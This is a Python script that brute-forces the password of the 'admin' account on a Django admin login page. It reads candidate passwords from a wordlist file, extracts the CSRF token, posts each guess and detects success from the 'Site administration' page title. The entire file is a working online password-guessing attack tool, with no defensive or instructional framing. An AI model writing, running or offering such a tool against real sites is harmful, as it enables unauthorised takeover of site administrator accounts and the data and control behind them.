import sys
import requests
import bs4 as bs
import time

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	address += '/admin/login/?next=/admin/'
	s = requests.Session()
	input_data = {}
	input_data['username'] = 'admin'
	input_data['csrfmiddlewaretoken'] = extract_token(s.get(address))
	for i in range(len(candidates)):
		input_data['password'] = candidates[i]
		s.post(address, data=input_data)
		site = s.get(address)
		if isloggedin(site):
			print()
			print('Password found:')
			return candidates[i]
		if i % 10 == 0:
			update_progress(i, len(candidates))
	return None

def update_progress(i: int, candidates: int) -> None:
	multiplier = 80
	progress = int(i/int(candidates/multiplier))
	print(f"{'#'*progress}{'-'*(multiplier-progress)} <{i} / {candidates}>", end="\r")


def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	start_time = time.time()
	print(test_password(address, candidates))
	print(f'Brute forcing password took {time.time()-start_time} seconds.')


if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
